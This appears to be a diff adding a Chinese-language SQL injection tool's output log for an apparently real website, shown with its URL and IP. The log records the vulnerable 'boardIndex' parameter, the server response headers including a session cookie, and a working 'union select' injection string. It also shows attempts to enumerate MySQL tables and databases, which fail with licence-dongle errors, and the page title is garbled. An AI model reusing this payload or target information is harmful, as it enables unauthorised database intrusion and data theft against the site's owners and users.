@@ -1,0 +1,41 @@
+■漏洞信息:============================================================
+ ·URL:http://www.sp-media.net/bbsp_list.php?boardIndex=15
+ ·页面标题：⑵⑵ 堡绊概眉辆钦沥焊荤捞飘 ⑵⑵
+ ·参数:boardIndex=15
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:php
+ ·IP:211.234.119.56
+ ·数据库:未知
+ ·HEAD:
+HTTP/1.1 200 OK
+Date: Wed, 30 Mar 2011 09:25:17 GMT
+Server: Apache/2.0.54 (Unix) PHP/5.0.4
+X-Powered-By: PHP/5.0.4
+Set-Cookie: PHPSESSID=d0879f546571460a00fa737762a3cf22; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Connection: close
+Content-Type: text/html
+
+
+ ·数据库:MySQL
+总数:21
+显示的列:3
+联合查询SQL：  and 3=8 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 -- 
+■Tables of mysql:
+table_name	table_rows
+------------------------------------------------------------
+取记录数失败。
+取记录数失败，使用设定值：5
+记录数:5
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+■数据库：
+数据库名	字符集名
+------------------------------------------------------------
+取记录数失败。
+取记录数失败，使用设定值：5
+记录数:5
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
